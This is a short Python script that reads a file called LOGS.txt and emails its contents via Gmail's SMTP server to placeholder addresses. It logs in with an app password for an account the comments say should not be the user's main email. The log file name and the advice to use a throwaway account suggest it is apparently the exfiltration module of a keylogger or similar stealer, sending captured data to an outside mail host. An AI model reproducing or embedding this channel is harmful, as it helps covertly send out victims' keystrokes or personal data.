import smtplib
from email.mime.text import MIMEText
from pathlib import Path
contents = Path("LOGS.txt").read_text()

smtp_ssl_host = 'smtp.gmail.com'  # smtp.mail.yahoo.com
smtp_ssl_port = 465
username = 'AN_EMAIL_WHICH_IS_NOT_YOUR_MAIN'
password = 'YOUR_APP_PASSWORD_FROM_YOUR_ALT_EMAIL'
sender =(username)
targets = ['YOUR_EMAIL', 'ANOTHER_EMAIL_IF_YOU_WANT']

msg = MIMEText(contents)
msg['Subject'] = 'logs'
msg['From'] = sender
msg['To'] = ', '.join(targets)

server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
server.login(username, password)
server.sendmail(sender, targets, msg.as_string())
server.quit()
